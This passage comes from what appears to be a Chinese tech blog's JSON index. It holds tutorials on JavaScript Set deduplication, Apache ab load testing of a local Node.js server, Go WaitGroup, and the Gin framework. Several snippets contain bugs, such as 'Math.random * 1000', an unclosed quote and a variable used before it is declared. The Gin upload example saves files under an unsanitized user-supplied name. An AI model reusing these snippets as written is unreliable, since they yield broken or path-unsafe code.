可以轻易实现集合的唯一性，但是 Set 并不是完美的可以实现集合的唯一性。所谓 Set 的缺陷，也就是说 Set 并不能完美的实现集合的唯一性。 下面来做一个实验： 在这里，大概可以知道怎么回事吧。 对于元素为数组、对象等引用类型，Set 就不能正确的对其进行去重。 可以看出，Set 的对比算法依旧是对引用类型进行内存地址的比较。 Set 内部判断两个值是否不同，使用的算法叫做 “Same-value equality”，它类似于精确相等运算符（===），主要的区别是 NaN 等于自身。 1234567function SameValue(v1, v2) &#123; if (v1 === 0 &amp;&amp; v2 === 0) return 1 / v1 === 1 / v2; if (v1 !== v1 &amp;&amp; v2 !== v2) return true; return v1 === v2;&#125; 如果，我们想存储对象，又想保持唯一性，那该怎么办？ 把引用类型转为值类型： 用非引用类型维护唯一性：用 Set 维护 id，用数组存储对象，在 add 时，对数组查找去除 id 不存在的元素。因为 s.add() 返回的是 Set 对象，而不是 true/false，所以并不知到是否插入成功，所以每次 add 时都需要查找，如果 id 为整数，可以把查找算法优化为O(logN)。 总结Set 的缺陷也是说的就是 Set 的对比算法（Same-value equality），也可以是 [] !== [] 的缺陷。对于一些引用类型，一旦内存地址不同，尽管样子长得一样，都会返回 false。","categories":[{"name":"ES6","slug":"ES6","permalink":"http://me.lizhooh.com/categories/ES6/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"ES6(ES2015)","slug":"ES6-ES2015","permalink":"http://me.lizhooh.com/tags/ES6-ES2015/"}]},{"title":"使用 Apache ab 对 Nodejs 进行并发负载的压力测试","slug":"测试/压力测试/使用 Apache ab 对 Nodejs 进行并发负载的压力测试","date":"2017-09-11T02:51:24.000Z","updated":"2021-06-15T06:10:52.919Z","comments":true,"path":"/stories/2017/09/测试/压力测试/使用 Apache ab 对 Nodejs 进行并发负载的压力测试/","link":"","permalink":"http://me.lizhooh.com/stories/2017/09/测试/压力测试/使用 Apache ab 对 Nodejs 进行并发负载的压力测试/","excerpt":"前言压力测试几乎是后端测试必不可少的一部分，有时候为了清楚，服务器能承受多少请求量，可以对服务器进行大量的并发测试。Apache 有一个 ab 模块，可以对应用进行并发的测试，巧好可以用来测试 Nodejs 的并发处理能力测试，压力测试。 Apache abApache ab测试工具是模拟多线程并发请求，就是有 n 多请求同时向服务器发送，同时也使得 ab 成为某些网络攻击的工具。在测试的时候， Apache ab 会创建尽可能多的线程进行测试，如果测试服务与 Apache ab 在同一台机器上，这样的测试结果会有些差异。","text":"前言压力测试几乎是后端测试必不可少的一部分，有时候为了清楚，服务器能承受多少请求量，可以对服务器进行大量的并发测试。Apache 有一个 ab 模块，可以对应用进行并发的测试，巧好可以用来测试 Nodejs 的并发处理能力测试，压力测试。 Apache abApache ab测试工具是模拟多线程并发请求，就是有 n 多请求同时向服务器发送，同时也使得 ab 成为某些网络攻击的工具。在测试的时候， Apache ab 会创建尽可能多的线程进行测试，如果测试服务与 Apache ab 在同一台机器上，这样的测试结果会有些差异。 Apache ab 在 Apache 的 bin 目录下，可以看到有 ab.exe 文件，为了方便使用，可以把这个目录路径添加到系统的 PATH 下。如果你没有安装 Apache，请先安装 Apache，一般有 xampp，phpStudy 这些软件包，可以在对应目录下寻找。 补充：除了使用 Apache ab 外，还可以使用 http_load，webbench 等压力测试工具。 一般来说只需要使用测试命令： 1ab -n100000 -c100 http://127.0.0.1:5000/ 其中： -n 指定请求数量 -c 指定并发数量 压力测试先是编写一个简单的 HTTP 服务，返回一段 json 数据，这段 json 数据有一定的大小。 123456789101112131415161718192021222324252627const Koa = require('koa');const Router = require('koa-router');const app = new Koa();const router = new Router();let n = 0;const list = [];for (let i = 0; i &lt; 30; i++) &#123; list.push(Math.random * 1000 | 0);&#125;router.get('/', ctx =&gt; &#123; ctx.body = &#123; stutas: ctx.status, data: list, id: 1 + n++, &#125;&#125;);app .use(router.routes()) .use(router.allowedMethods());app.listen(5000, () =&gt; &#123; console.log('server run in 5000');&#125;); 执行命令： 1ab -n100000 -c100 http://127.0.0.1:5000/ 测试结果： 1234567891011121314151617181920212223242526272829303132333435Server Software:Server Hostname: 127.0.0.1 # 主机名Server Port: 5000 # 端口Document Path: / # 路径Document Length: 75 bytesConcurrency Level: 100 # 并发数Time taken for tests: 25.627 seconds # 测试使用的时间Complete requests: 100000 # 完成的请求数Failed requests: 0 # 失败的请求数，即表示超负荷数Total transferred: 21700000 bytes # 总共传输字节数，包含 http 的头信息等HTML transferred: 7500000 bytes # html 字节数，实际的页面传递字节数Requests per second: 3902.06 [#/sec] (mean) # 每秒多少请求，即服务器的吞吐量Time per request: 25.627 [ms] (mean) # 用户平均请求等待时间Time per request: 0.256 [ms] # 服务器平均处理时间，即服务器吞吐量的倒数Transfer rate: 826.90 [Kbytes/sec] received # 每秒获取的数据长度Connection Times (ms) # 连接时间 min mean[+/-sd] median maxConnect: 0 0 0.3 0 2Processing: 9 25 3.0 25 44Waiting: 8 25 3.0 24 43Total: 9 26 3.0 25 44Percentage of the requests served within a certain time (ms) 50% 25 # 50% 的请求在 25ms 内返回 66% 26 # 60% 的请求在 26ms 内返回 75% 27 # 70% 的请求在 27ms 内返回 80% 27 # 80% 的请求在 27ms 内返回 90% 30 # 90% 的请求在 30ms 内返回 95% 32 # 95% 的请求在 32ms 内返回 98% 34 # 98% 的请求在 34ms 内返回 99% 35 # 99% 的请求在 35ms 内返回 100% 44 (longest request) # 100% 的请求在 44ms 内返回 可以看出，Nodejs 的并发处理能力非常优秀，在10w请求量，并发100，也能在 50ms 内完成。当然这没有只是一个简单的 HTTP 服务，也没有包括 IO，数据库方面的操作，加上电脑的 CPU 并不是服务器的级别，总之数据仅限参考。 均衡负载测试下面进行 10w 请求，1000 并发量的测试。 1234567891011121314151617181920212223242526272829303132333435Server Software:Server Hostname: 127.0.0.1Server Port: 5000Document Path: /Document Length: 75 bytesConcurrency Level: 1000Time taken for tests: 52.963 secondsComplete requests: 100000Failed requests: 0Total transferred: 21700000 bytesHTML transferred: 7500000 bytesRequests per second: 1888.11 [#/sec] (mean)Time per request: 529.630 [ms] (mean)Time per request: 0.530 [ms] (mean, across all concurrent requests)Transfer rate: 400.12 [Kbytes/sec] receivedConnection Times (ms) min mean[+/-sd] median maxConnect: 0 0 12.0 0 509Processing: 48 525 259.7 740 792Waiting: 35 412 269.3 225 782Total: 48 526 259.7 740 792Percentage of the requests served within a certain time (ms) 50% 740 66% 750 75% 755 80% 757 90% 764 95% 770 98% 776 99% 781 100% 792 (longest request) 可以看出，当请求量 10w，并发量达到1000以上的时候，Nodejs 已经开始忙不过来了，不过可以开启均衡负载模式，进一步提供并发处理能力。 使用 PM2 Cluster使用 PM2 开启均衡负载，也就是集群模式（cluster） 1pm start yali.js -i max 下面是测试结果： 1234567891011121314151617181920212223242526272829303132333435Server Software:Server Hostname: 127.0.0.1Server Port: 5000Document Path: /Document Length: 74 bytesConcurrency Level: 1000Time taken for tests: 27.475 secondsComplete requests: 100000Failed requests: 0Total transferred: 21600000 bytesHTML transferred: 7400000 bytesRequests per second: 3639.73 [#/sec] (mean)Time per request: 274.746 [ms] (mean)Time per request: 0.275 [ms] (mean, across all concurrent requests)Transfer rate: 767.76 [Kbytes/sec] receivedConnection Times (ms) min mean[+/-sd] median maxConnect: 0 0 0.3 0 4Processing: 62 273 18.2 272 362Waiting: 9 137 73.8 136 347Total: 62 273 18.2 272 362Percentage of the requests served within a certain time (ms) 50% 272 66% 275 75% 277 80% 279 90% 284 95% 293 98% 329 99% 348 100% 362 (longest request) 比较：1888.11 [#/sec]，3639.73 [#/sec]。可以看出在均衡负载的模式下，并发处理能力基本提升了 2 倍多。 压力测试指标测试结果出来了，有时候需要根据测试结果来确定是否需要优化，添加服务数量等。 先来说说，有哪些测试指标： TPS：即每秒钟完成的请求数量。也即是上面的 3639.73 [#/sec] 并发数：时间段，系统同时处理的请求数量 响应时间：所有请求处理完毕的使用时间 吞吐量：单位时间系统传送的总量。 PV：页面浏览量，页面每刷新一次算一个 PV 流量。 通过这里指标，我们可以计算出需要的服务器数量。假设每天80%的访问量集中在20%的时间段里，这个时间段就叫峰值时间。因此只要确保在峰值时间里服务器也能扛起并发访问压力就可以了。 设定：某网站，每天有300W PV，使用单台服务器提供服务。那么这台服务器需要多少的 TPS？ TPS = ( 300w × 0.8 ) / ( 24h × 60 × 60 × 0.2 ) = 139 如果，每台服务器的 TPS 为 M，每天有 P 个PV，那么需要 N（N 应向上取整）服务器才能支撑整个后端服务。 N = ((P × 0.8) / (24 × 60 × 60 × 0.2)) / M 总结 压力测试机器，不应与服务端在同一个机器上，最好进行外网测试，而不是内网测试 压力测试工作应该放到产品上线之前，而不是上线以后 一般只需要对 get 进行测试，如果 post 流量比价大，也可以对 post 进行测试。 测试时并发应当由小逐渐加大，比如并发 100 时观察一下网站负载是多少、打开页面是否流畅 更详细的进行某个页面测试，如电商网站可以着重测试搜索页、推广页面等流量大的页面","categories":[{"name":"测试","slug":"测试","permalink":"http://me.lizhooh.com/categories/测试/"}],"tags":[{"name":"后端","slug":"后端","permalink":"http://me.lizhooh.com/tags/后端/"},{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/tags/Nodejs/"},{"name":"测试","slug":"测试","permalink":"http://me.lizhooh.com/tags/测试/"}]},{"title":"谈谈 Go 是如何控制异步流程","slug":"Go/谈谈 Go 是如何控制异步流程","date":"2017-09-08T11:08:59.000Z","updated":"2021-06-15T06:10:52.819Z","comments":true,"path":"/stories/2017/09/Go/谈谈 Go 是如何控制异步流程/","link":"","permalink":"http://me.lizhooh.com/stories/2017/09/Go/谈谈 Go 是如何控制异步流程/","excerpt":"前言Go 语言是一种并发编程语言，在 Go 里有一个非常重要的关键字 go（goroutine），一般我们可以用它做一些异步，并发的任务。goroutine 用来调用函数，当某个函数被 go 关键字调用后，go 就会创建一个类似协程的东西，来执行这个函数，这样可以轻易的实现并发。 但有个问题， goroutine 只是用来声明并发，如果我们的任务需要在上一个异步任务完成后才能开始，那么就涉及到了异步流程控制的问题。 比如，我想 work1，work2，work3 是异步进行的，它们谁也不会阻塞谁。在它们全部完成后，就输出提示，很明显下面的代码是不能达到预期的效果的。 12345go work1();go work2();go work3();fmt.Println(\"[全部完成]\");","text":"前言Go 语言是一种并发编程语言，在 Go 里有一个非常重要的关键字 go（goroutine），一般我们可以用它做一些异步，并发的任务。goroutine 用来调用函数，当某个函数被 go 关键字调用后，go 就会创建一个类似协程的东西，来执行这个函数，这样可以轻易的实现并发。 但有个问题， goroutine 只是用来声明并发，如果我们的任务需要在上一个异步任务完成后才能开始，那么就涉及到了异步流程控制的问题。 比如，我想 work1，work2，work3 是异步进行的，它们谁也不会阻塞谁。在它们全部完成后，就输出提示，很明显下面的代码是不能达到预期的效果的。 12345go work1();go work2();go work3();fmt.Println(\"[全部完成]\"); GoroutineGoroutine 指的是那些独立于其他 goroutine 运行的函数。这一概念看起来和线程有些相似，但实际上 goroutine 并不是线程，它只是对线程的多路复用。因为 goroutine 都是轻量级的因此在内存的限制下，goroutine 可以比线程的数量多出很多。一个 goroutine 在启动时只需要一个非常小的栈（只有 4K），并且这个栈可以按需扩展和缩小。当一个 goroutine 被阻塞时，它也会阻塞所复用的操作系统线程，而运行时环境则会把位于被阻塞线程上的其他 goroutine 移动到其他未被阻塞的线程上进行运行。 Go 运行时会使用多个 CPU，可以指定是 CPU 个数： 1go run index.go -cpu 1 Nodejs 的异步任务先来看看 Nodejs 里是如何控制异步流程。 12345678910111213async function work(time, str) &#123; await new Promise(rs =&gt; setTimeout(rs, time)); console.log(str);&#125;async function main() &#123; await Promise.all([ work(3000, \"[右手工作]：工作了 3 秒\"), work(5000, \"[左手工作]：工作了 5 秒\"), ]); console.log(\"[全部工作完]：用时 5 秒\");&#125; 上面代码从宏观的角度看，只执行了 5 秒，看起来就好像并发的执行了两个任务。（但从微观的角度上看，两个任务并不是并发执行的，这里涉及了一些概念） 在 Nodejs 没有 ES6，ES7 的时代，是使用回调函数来进行异步的控制，这显然是非常糟糕的。而 ES6，ES7 的出现，使用 Promise + Async 的方案，让一切异步流程都变得非常明了。 Go 的异步任务在 Go 里，可以使用 goroutine + channel 来控制异步流程，但是 channel 并不好用，而且比较难理解。那么有没有不使用 channel 的方法？恰好，Go 提供了sync的模块，方便你控制异步流程。 来看看，如何使用 Go 实现上面的功能： 123456789101112131415161718192021222324252627package mainimport ( \"fmt\" \"sync\" // 引入库 \"time\")var w sync.WaitGroup // 全局定义func work(n int64, str string) &#123; time.Sleep(time.Duration(n * 1000 * 1000)) fmt.Println(str) w.Done() // 任务完成&#125;func main() &#123; w.Add(2) // 2 个异步任务 &#123; go work(5000, \"[左手工作]：工作了 5 秒\") go work(3000, \"[右手工作]：工作了 3 秒\") &#125; w.Wait() // 等待所有的异步任务完成 fmt.Println(\"[全部工作完]：用时 5 秒\")&#125; WaitGroup: 给一个类似队列似得东西初始化一个任务数量，完成一个减少一个。 在这里，使用了 sync 模块来控制流程。先是全局定义了一个 WaitGroup ，然后通过 w.Add(n) 来添加等待的任务数量，同时需要在任务里添加 w.Done() 表示任务已经完成了，最后使用 w.Wait() 来所有任务的完成。这就看起来就像是，使用同步的思维去写异步的代码。 当一个 sync.WaitGroup 类型的变量被声明之后，其中 sync.WaitGroup 内部有一个计数将被设置为 0。可以通过该值的 Add 方法增大或减少其中的计数值，例如：w.Add(3)，w.Add(-3)。而 w.Add(-3) 相当于调用了 3 次的 w.Done()。 上面代码可以改为： 123456func work(n int64, str string) &#123; time.Sleep(time.Duration(n * 1000 * 1000)) fmt.Println(str) w.Add(-1); // 与 w.Done() 效果一样哦&#125; 可以在源码里查询 w.Done 的实现： 1234// Done decrements the WaitGroup counter by one.func (wg *WaitGroup) Done() &#123; wg.Add(-1)&#125; 注意无论如何也不要让计数变为负数，不然会报错： 1234567func main() &#123; // ... w.Add(3) w.Add(-4) // 报错，这时计数为 -1 // ...&#125; w.Add 可以连续添加： 12345for i := 0; i &lt; 10; i++ &#123; w.Add(1) // 每创建一个 goroutine，就把异步任务队列中任务的数量 +1 go work(i)&#125;w.Wait() // w.Wait() 这里会发生阻塞，直到队列中所有的任务结束就会解除阻塞 注意事项w.Add(n) 与 w.Wait()不能随便使用，一旦不合理的使用就会发生不可避免的错误，而且这种错误是在运行时期发生的。 w.Add(n) 与 w.Wait() 之间的 w.Done() 数量只能多，不能少。比如 go func 只有 2 个，而 w.Add(3)，这时会报错。当 go func 比 w.Add(n) 多时，WaitGroup 会按照 go func 的 w.Done 先后顺序添加到队列里，而多出来的 go func 将会不知所踪。 123456789101112begin := time.Now()w.Add(2)&#123; go work(5000, \"[左手工作]：工作了 5 秒\") go work(3000, \"[右手工作]：工作了 3 秒\") go work(1000, \"[左手工作]：工作了 1 秒\") go work(2000, \"[右手工作]：工作了 2 秒\")&#125;w.Wait()fmt.Println(time.Since(begin)) 上面输出的结果是： 123[左手工作]：工作了 1 秒[右手工作]：工作了 2 秒2.0001144s 前面说了，在 sync.WaitGroup 内部有一个计数器来计数，这个计数不能为负数，每次使用 w.Done() 都会使其减少一。 每次使用 w.Add(n) 时，都会改变计数器的只，使用 w.Wait() 之后，就会等待计数器计数值为 0，当为 0 时将不继续等待。 123456789func main() &#123; w.Add(2) // 2 个异步任务 &#123; w.Add(2) // 再加 2 个 w.Add(-4) // 消去 4 个 &#125; w.Wait() // 计数器为 0 fmt.Println(\"[全部工作完]：用时 5 秒\")&#125; 一个函数内可以多次使用 w.Done()，并且可以在函数内最前使用 defer w.Done()。 defer: 当函数执行到最后时，这些 defer 语句会按照逆序执行，最后该函数返回。 123456789101112131415// 贪心的使用了两次 Donefunc workTwoDone(n int64, str string) &#123; defer w.Done() defer w.Done() time.Sleep(time.Duration(n * 1000 * 1000)) fmt.Println(str)&#125;// 不会报错呦w.Add(2)&#123; go workTwoDone(3000, \"[右手工作]：工作了 3 秒\")&#125;w.Wait() 如果你手贱，不知道为什么自己写出了如下的代码那就等泪奔吧： 12345678// 不会报错呦，但是看不到 work 的输出，因为 下面的两个 w.Done() 已经把次数消耗完了。w.Add(2)&#123; go work(5000, \"[左手工作]：工作了 5 秒\") w.Done() w.Done()&#125;w.Wait() 为什么会这样，因为 defer w.Done() 要在函数最后才会调用，所以下面两个 w.Done() 要比 w.Done() 早调用。 如果在 w.Wait() 之前计数器的值减少不到为 0，那么会报错。 1234567891011121314// 不会报错呦w.Add(1)&#123; w.Done()&#125;w.Wait()// 会报错呦w.Add(1)&#123; // 你在等谁？&#125;w.Wait()w.Done() // &lt;- 有人在等我吗？ WaitGroup 可以灵活的控制异步流程，可以随时的添加任务到队列里。 123456789// 终于看到输出了w.Add(2)&#123; w.Add(1) go work(5000, \"[左手工作]：工作了 5 秒\") w.Done() w.Done()&#125;w.Wait() 还可以串行添加： 12345678910111213// 下面，总共用时 5 + 3 + 3 = 8 秒w.Add(2)&#123; go work(5000, \"[左手工作]：工作了 5 秒\") go work(3000, \"[右手工作]：工作了 3 秒\")&#125;w.Wait()w.Add(1)&#123; go work(3000, \"[右手加班工作]：工作了 3 秒\")&#125;w.Wait() 没有 w.Wait()，并不会等待，没 w.Wait()，你等个啥？ 123456789// 输出 0sbegin := time.Now()w.Add(1)&#123; go work(5000, \"[左手工作]：工作了 5 秒\")&#125;fmt.Println(time.Since(begin)) 实践下面通过实践示例，来说明 w.Add，w.Done，w.Wait 的用途。 并行现在有一个计算任务，它的计算数据非常多，计算时间很长。为什么不阻塞线程，我们需要使用 goroutine 来计算。但是如果只使用一个 goroutine 来计算还是需要等待很长的时间，不如把整个计算任务分成几部分，每部分由一个 goroutine 去计算，最后把计算结果合并起来，这就好像使用“分解法”一样。 下面是通过模拟一个完全并行的一个计算任务：计算 N 个整数的总和，我们可以把所有的整数分成 M 份（M 即 CPU 个数）。每份由一个 goroutine 去计算，最后将每个 goroutine 计算的结果再做一次累加，就可以得到计算的结果了。 （N = 10000 × 1000 × 10，M = 4） 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758package mainimport ( \"fmt\" \"math/rand\" \"runtime\" \"sync\" \"time\")var w sync.WaitGroup// go func 不能接收到返回值，故使用引用传值func cusum(arr []int64, s *int64) &#123; defer w.Done() for i, l := 0, len(arr); i &lt; l; i++ &#123; *s += int64(arr[i]) // 指针，*p 是值，p 是地址 &#125;&#125;func main() &#123; rand.Seed(time.Now().Unix()) // 随机数种子 runtime.GOMAXPROCS(M) // 运行在多核上 const N = 10000 * 1000 * 10 // 1 亿个 var M int = runtime.NumCPU() // cpu 个数 var AVG int = N / M // 平均 2500 万个 var list []int64 = make([]int64, N) var res []int64 = make([]int64, 4) var sum int64 // 创建数据 for i := 0; i &lt; N; i++ &#123; list[i] = int64(rand.Intn(100)) &#125; begin := time.Now() // 并行计算 w.Add(M) &#123; for i := 0; i &lt; M; i++ &#123; go cusum(list[i * AVG : (i + 1) * AVG], &amp;res[i]) &#125; &#125; w.Wait() w.Add(1) &#123; go cusum(res, &amp;sum) &#125; w.Wait() fmt.Println(sum) // 4950263077 fmt.Println(time.Since(begin)) // 98.0098ms&#125; 总结Golang 提供了 go 关键字，让开发者很容易的实现了并发的操作，同样也带来一些问题，那就异步/并发的流程控制，数据同步等问题。 通过 goroutine 与 sync，甚至是 channel，我们也可以轻易的解决这些问题。目前来说，也没有比较统一的解决方案，大家的想法也是百花齐放的。 参考资料 http://www.infoq.com/cn/articles/golang-standard-library-part01/ https://segmentfault.com/a/1190000000506960 http://ifeve.com/go-concurrent-waitgroup/","categories":[{"name":"Go","slug":"Go","permalink":"http://me.lizhooh.com/categories/Go/"}],"tags":[{"name":"后端","slug":"后端","permalink":"http://me.lizhooh.com/tags/后端/"},{"name":"Go","slug":"Go","permalink":"http://me.lizhooh.com/tags/Go/"}]},{"title":"Go Web 开发","slug":"Go/Go Web 开发","date":"2017-09-07T05:03:27.000Z","updated":"2021-06-15T06:10:52.817Z","comments":true,"path":"/stories/2017/09/Go/Go Web 开发/","link":"","permalink":"http://me.lizhooh.com/stories/2017/09/Go/Go Web 开发/","excerpt":"前言Go 是一种新的语言，一种并发的、带垃圾回收的、快速编译的语言，被誉为速度最接近 C 的语言，本文，记录着如何使用 Go 来快速的搭建 Web 服务。先使用 Go 的 http 模块，搭建一个简单的 HTTP 服务，接着介绍使用 Gin 搭建的 HTTP 服务。","text":"前言Go 是一种新的语言，一种并发的、带垃圾回收的、快速编译的语言，被誉为速度最接近 C 的语言，本文，记录着如何使用 Go 来快速的搭建 Web 服务。先使用 Go 的 http 模块，搭建一个简单的 HTTP 服务，接着介绍使用 Gin 搭建的 HTTP 服务。 原生的 http 模块Go 自带了 http 很好的为我们提供了 http 相关的 api，下面是使用 Go http 模块搭建的一个 “Hello Wrold”，示例。这相当于在 Nodejs 里的 http.createServer一样。 123456789101112131415161718192021package mainimport ( \"fmt\" \"log\" \"net/http\")func index(w http.ResponseWriter, r *http.Request) &#123; fmt.Fprintf(w, \"Hello Wrold!\") // 把 \"Hello Wrold\" 写入到 response 流&#125;func main() &#123; http.HandleFunc(\"/\", index) // 路由 fmt.Println(\"Server run in 5000 \") err := http.ListenAndServe(\":5000\", nil) // 监听 if err != nil &#123; log.Fatal(\"ListenAndServe: \", err) &#125;&#125; 在这里，使用 http 模块创建一个路由，路由回调函数的参数是 resource 与 request 对象指针，再接着通过监听 5000 端口来提供服务。 GinGo 语言 web 框架挺多的，各有各的特点和风格。在这里使用的是 Gin，感觉它就是 Nodejs 的 Koa。Gin 是一个 Go 的 Web 框架，它就像 Nodejs 中的 Express/Koa 一样出色。 Gin 的特性： 安装： 1go get github.com/gin-gonic/gin 基本使用Gin 的与 Nodejs 的 Koa 有几分的相似度。 123456789101112131415161718192021222324252627282930package mainimport ( \"fmt\" \"net/http\" \"github.com/gin-gonic/gin\")func main() &#123; router := gin.Default() router.Use(func(crx *gin.Context) &#123; // 这是中间件 fmt.Println(\"this is a middleware!\") &#125;) router.Any(\"/\", func(ctx *gin.Context) &#123; // 响应 json ctx.JSON(http.StatusOK, gin.H&#123;\"name\": \"小明\", \"age\": 20&#125;) &#125;) router.GET(\"/:name\", func(ctx *gin.Context) &#123; name := ctx.Param(\"name\") // 响应纯文本 ctx.String(http.StatusOK, \"Hello %s\", name) &#125;) router.Run(\":5000\")&#125; 在 Gin 里，使用 *gin.Context 来表示 request 与 response 的上下文。在 Go 里用 json 还是比较麻烦的，不过 Gin 封装好了一个 gin.H 的结构，让你可以轻易的使用 json。在 Gin 里，中间件默认是不会停止的。 路由组Gin 提供路由组的玩法，也就是嵌套路由的玩法。 12345678910111213141516171819router := gin.Default()// Simple group: v1v1 := router.Group(\"/v1\")&#123; v1.GET(\"/api\", func(ctx *gin.Context) &#123; ctx.JSON(200, gin.H&#123;\"msg\": \"api v1\"&#125;) &#125;)&#125;// Simple group: v2v2 := router.Group(\"/v2\")&#123; v2.GET(\"/api\", func(ctx *gin.Context) &#123; ctx.JSON(200, gin.H&#123;\"msg\": \"api v2\"&#125;) &#125;)&#125;router.Run(\":5000\") 通过访问：/v1/api，/v2/api，可以看到不同点。在这里，{ } 只是提供一个局部作用域，去掉也无妨。 路由参数路由参数使用 ctx.Param 获取，通过 key 的形式获取对应路由参数。路由参数没有缺省值，并不能使用 name?。 123456router.GET(\"/user/:name/*action\", func(ctx *gin.Context) &#123; name := ctx.Param(\"name\") action := ctx.Param(\"action\") message := name + \" is \" + action ctx.String(200, message)&#125;) *action 代表的是全部，即可以访问：/user/john/send 查询参数查询（query）参数使用 ctx.Query，也可以使用 c.Request.URL.Query().Get，效果都一样。 如果某个 query key 不存在，可以使用 ctx.DefaultQuery指定其默认值。 123456router.GET(\"/welcome\", func(ctx *gin.Context) &#123; name := ctx.DefaultQuery(\"name\", \"Guest\") age := ctx.Query(\"age\") ctx.String(200, \"Hello %s %s\", name, age)&#125;) 表单数据表单数据，使用 ctx.PostForm 与 ctx.DefaultPostForm。 解析的类型可以是 multipart/Urlencoded 与 application/x-www-form-urlencoded。 123456789router.POST(\"from\", func(ctx *gin.Context) &#123; name := ctx.PostForm(\"name\") age := ctx.DefaultPostForm(\"age\", \"20\") // 默认参数7 ctx.JSON(200, gin.H&#123; \"name\": name, \"age\": age, &#125;)&#125;) 目前，Gin 并未实现对 post json 的直接解析：https://github.com/gin-gonic/gin/issues/931另外，参考使用属性绑定的方式：https://github.com/gin-gonic/gin/tree/develop#model-binding-and-validation 下面的代码，要想获取其值，需要使用 模型绑定 1234567891011fetch('http://127.0.0.1:5000/from', &#123; method: 'POST', headers: &#123; 'Content-Type': 'application/json' &#125;, body: JSON.stringify(&#123; name: '小明', age: 20, &#125;) &#125;) .then(res =&gt; res.json()); 或者，使用 multipart/Urlencoded： 123456789101112fetch('http://127.0.0.1:5000/from', &#123; method: 'POST', headers: &#123; 'Content-Type': 'multipart/Urlencoded' &#125;, // name=小明&amp;age=20 body: qs.stringify(&#123; name: '小明', age: 20, &#125;) &#125;) .then(res =&gt; res.json()); 上传文件Gin 集成了上传文件的功能，这显得上传文件变得很简单。 12345678910111213router.POST(\"/upload\", func(ctx *gin.Context) &#123; // 解析文件，file 是前端的 `&lt;from name='file' enctype=\"multipart/form-data\"/&gt;`， // 或者是 HTML 异步上传，设置的 from name。 file, _ := ctx.FormFile(\"file\") // 上传的文件会暂时存放在临时目录， // 在 Window 上就是：C:\\Users\\Administrator\\AppData\\Local\\Temp ctx.SaveUploadedFile(file, \"./upload\" + file.Filename) log.Println(file.Filename) ctx.String(http.StatusOK, fmt.Sprintf(\"'%s' uploaded!\", file.Filename))&#125;) 中间件gin.Default，使用了 Logger 与 Recovery，如果你想获得一个最初的实例，可以使用 gin.New()（默认情况下创建没有任何中间件的路由器） 123router := gin.New()router.Use(gin.Logger())router.Use(gin.Recovery()) 日志文件Gin 默认会把所有的日志，输出到控制台。如果你想把日志保存到文件里，那就需要更改 Gin 的配置。 1234567891011121314// 禁用控制台颜色，在将日志写入文件时不需要控制台颜色。gin.DisableConsoleColor()// 输出到文件里f, _ := os.Create(\"gin.log\")gin.DefaultWriter = io.MultiWriter(f)// 如果您需要同时将日志写入文件和控制台，请使用以下代码。// gin.DefaultWriter = io.MultiWriter(f, os.Stdout)router := gin.Default()router.GET(\"/ping\", func(c *gin.Context) &#123; c.String(200, \"pong\")&#125;) 模型绑定可以使用 ctx.BindJSON, ctx.Bind, ctx.BindQuery 对数据模型的绑定，它们都返回 error。目前支持绑定 JSON，XML 和 标准表单值。模型绑定还可以定义检验规则，自定义检验规则请参考文档。 其中： BindJSON：绑定 json 数据。 Bind：绑定 from 数据。 BindQuery：绑定 query 数据。 1234567891011121314// 模型type Login struct &#123; User string `form:\"user\" json:\"user\" binding:\"required\"` Password string `form:\"password\" json:\"password\" binding:\"required\"`&#125;router.POST(\"/loginJSON\", func(ctx *gin.Context) &#123; var json Login // 在这里，把 ctx.PostForm(\"User\") 绑定到 json.User 里 // 也就是说，BindJSON 帮你完成了 json.User = ctx.PostForm(\"User\") if ctx.BindJSON(&amp;json) == nil &#123; // ... doing some &#125;&#125;) 静态资源使用 Static 方法可以设置静态资源目录或文件，一般来说，应该优先放到所有路由的最前面。 12345678910router := gin.Default()// 设置目录router.Static(\"/assets\", \"./assets\")// 设置可以直接查看目录树router.StaticFS(\"/morestatic\", http.Dir(\"myfilesystem\"))// 设置文件router.StaticFile(\"/favicon.ico\", \"./resources/favicon.ico\") 视图渲染使用 LoadHTMLGlob() 或 LoadHTMLFiles() 进行 http 渲染。 1234567891011router := gin.Default()router.LoadHTMLGlob(\"templates/*\") // 所有文件// 特定文件// router.LoadHTMLFiles(\"templates/template1.html\", \"templates/template2.html\")router.GET(\"/index\", func(ctx *gin.Context) &#123; ctx.HTML(200, \"index.tmpl\", gin.H&#123; \"title\": \"Main website\", &#125;)&#125;) 模版语法： 123456&lt;!--templates/index.tmpl--&gt;&lt;html&gt; &lt;h1&gt; &#123;&#123; .title &#125;&#125; &lt;/h1&gt;&lt;/html&gt; 自定义分隔符： 1r.Delims(\"&#123;\", \"&#125;\") 重定向使用 ctx.Redirect 进行重定向域名。 123router.GET(\"/test\", func(ctx *gin.Context) &#123; ctx.Redirect(http.StatusMovedPermanently, \"http://www.google.com/\")&#125;) 自定义中间件下面介绍如何自定义一个日志中间件： 123456789101112131415161718192021func Logger() gin.HandlerFunc &#123; return func(ctx *gin.Context) &#123; t := time.Now() // 设置一个值 ctx.Set(\"example\", \"12345\") // 类似 Nodejs Express/Koa 的 next 意思 ctx.Next() // 计算时间差 latency := time.Since(t) log.Print(latency) // 获取到之前设置的值 log.Println(ctx.Get('example)) status := c.Writer.Status() log.Println(status) &#125;&#125; Goroutines 在一个中间件里当在中间件或处理程序中使用 go 关键字时，您不应该使用其中的原始上下文，您必须使用只读副本。 123456789101112router.GET(\"/long_async\", func(c *gin.Context) &#123; // 创建一个副本在 goroutine 里使用 ctxCp := ctx.Copy() go func() &#123; // 模拟一个 5 秒时间的任务， time.Sleep(5 * time.Second) // 请注意，您使用的是复制的上下文 log.Println(\"Done! in path \" + ctxCp.Request.URL.Path) &#125;()&#125;) 自定义 HTTP 配置通过 http 模块进行自定义 http 配置。 12345678910router := gin.Default()s := &amp;http.Server&#123; Addr: \":8080\", Handler: router, ReadTimeout: 10 * time.Second, WriteTimeout: 10 * time.Second, MaxHeaderBytes: 1 &lt;&lt; 20,&#125;s.ListenAndServe() 热重启每次修改文件时，自动重启应用程序，在 Nodejs 里可以使用 nodemon，在 Go 里则使用 Fresh。 参考资料 